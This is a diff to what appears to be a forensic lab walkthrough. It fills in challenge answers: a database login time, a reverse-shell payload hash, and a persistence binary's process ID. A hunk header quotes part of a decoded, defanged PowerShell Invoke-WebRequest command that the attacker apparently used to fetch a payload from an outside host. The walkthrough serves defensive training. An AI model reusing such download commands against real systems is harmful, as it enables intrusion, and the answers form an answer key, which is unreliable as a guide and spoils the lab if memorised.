@@ -72,10 +72,9 @@ If you review logs with requests for oldsite/. Path traversal vulnerability is e
 ### Task 6
 **Question:** When did the threat actor first successfully authenticate to the MySQL database?
 
-**Answer:** ``
+**Answer:** `2025-09-07 12:39`
 
 **Explanation:**
-
 
 > *Screenshot placeholder*
 ---
@@ -104,8 +103,6 @@ If you review logs with requests for oldsite/. Path traversal vulnerability is e
 
 **Explanation:** Reviewing the logs would provide a different IP address making requests 
 
-
-> *Screenshot placeholder*
 ---
 
 ### Task 10
@@ -176,19 +173,17 @@ Once you decode you will  find following code " Invoke-WebRequest -Uri "hxxp://w
 
 **Explanation:**
 
-
 > *Screenshot placeholder*
 ---
 
 ### Task 17
 **Question:** What is the SHA-256 hash of the reverse-shell payload the threat actor uploaded and used with the previously identified binary?
 
-**Answer:** ``
+**Answer:** `087e9494deb843bf6c1f9284697658cb06ac1ac537c1b738ec3bc80f24f32731`
 
-**Explanation:**
+**Explanation:** Review the EDR alert from Microsoft defender under C:\ProgramData\Microsoft\Windows Defender\Support\MPLog
 
-
-> *Screenshot placeholder*
+> <img width="1454" height="150" alt="Q17" src="https://github.com/user-attachments/assets/ebcdd468-face-4a8a-83f6-b6984cb110a3" />
 ---
 
 ### Task 18
@@ -214,13 +209,13 @@ Once you decode you will  find following code " Invoke-WebRequest -Uri "hxxp://w
 ### Task 20
 **Question:** The persistence binary executed once on the compromised system. What was the process ID of this execution?
 
-**Answer:** ``
+**Answer:** `8056`
 
-**Explanation:**
+**Explanation:** Review PID for spoolsc.exe
 
-
-> *Screenshot placeholder*
+> <img width="1454" height="150" alt="Q17" src="https://github.com/user-attachments/assets/d9a97e0b-8fcb-487f-a922-242c23f59f4d" />
 ---
+
 
 
 
